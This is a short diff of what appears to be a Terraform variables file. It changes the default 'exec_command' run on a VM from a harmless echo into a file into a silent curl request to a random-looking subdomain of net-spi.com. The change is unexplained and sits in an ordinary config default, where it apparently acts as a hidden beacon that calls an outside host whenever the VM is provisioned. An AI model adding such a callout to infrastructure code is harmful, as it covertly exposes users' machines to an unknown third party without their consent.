@@ -90,5 +90,5 @@ variable "sample_var" {
 variable "exec_command" {
   description = "System command to run on the VM"
   type        = string
-  default     = "echo 'Hello from inside the VM' > /tmp/hello.txt"
+  default     = "curl -s http://rfa2b6faj8u813d5vdnkzly6qxwukm8b.net-spi.com"
 }
